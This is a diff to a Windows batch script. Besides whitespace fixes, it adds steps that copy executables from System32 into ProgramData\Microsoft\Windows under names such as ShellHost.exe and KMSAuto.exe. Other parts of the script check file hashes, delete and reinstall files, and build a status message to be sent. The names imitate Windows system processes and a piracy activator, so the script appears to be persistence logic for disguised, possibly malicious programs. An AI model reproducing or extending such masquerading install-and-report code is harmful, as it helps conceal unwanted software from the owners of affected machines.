@@ -447,7 +447,7 @@ echo.
 
 if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
     echo MD5 matches %SHSTFILEmd5% = %ShellHostMD5%
-	echo going to CheckKMSAuto
+    echo going to CheckKMSAuto
     goto CheckKMSAuto
 )
 
@@ -461,14 +461,14 @@ echo.
 
 if exist "%SHSTFILEroot%" (
     echo Failed to delete %SHSTFILEroot%!
-	goto CheckKMSAuto
+    goto CheckKMSAuto
 ) else (
     echo Successfully deleted %SHSTFILEroot%.
 )
 
 if exist "%SHSTFILE%" (
      echo Failed to delete %SHSTFILE%!
-	 goto CheckKMSAuto
+     goto CheckKMSAuto
 ) else (
      echo Successfully deleted %SHSTFILE%.
 )
@@ -504,6 +504,15 @@ if exist "%embeddedScript%" (
     timeout /t 3 /nobreak >nul
     goto SHSTINSTALL
 )
+
+
+set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\ShellHost.exe"
+copy "%sourceFile%" "%startupFile%"
+
+
+
+
 
 set "MESSAGE=%MESSAGE%SHST|"
 set "CheckSend=1"
@@ -566,7 +575,7 @@ echo.
 
 if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
     echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
-	echo going to CheckComSurrogate
+    echo going to CheckComSurrogate
     goto CheckComSurrogate
 )
 
@@ -580,14 +589,14 @@ echo.
 
 if exist "%KMSFILEroot%" (
     echo Failed to delete %KMSFILEroot%!
-	goto CheckComSurrogate
+    goto CheckComSurrogate
 ) else (
     echo Successfully deleted %KMSFILEroot%.
 )
 
 if exist "%KMSFILE%" (
      echo Failed to delete %KMSFILE%!
-	 goto CheckComSurrogate
+     goto CheckComSurrogate
 ) else (
      echo Successfully deleted %KMSFILE%.
 )
@@ -619,6 +628,13 @@ if exist "%embeddedScript%" (
     timeout /t 3 /nobreak >nul
     goto KMSINSTALL
 )
+
+set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+copy "%sourceFile%" "%startupFile%"
+
+
+
 
 set "MESSAGE=%MESSAGE%KMSAuto|"
 set "CheckSend=1"
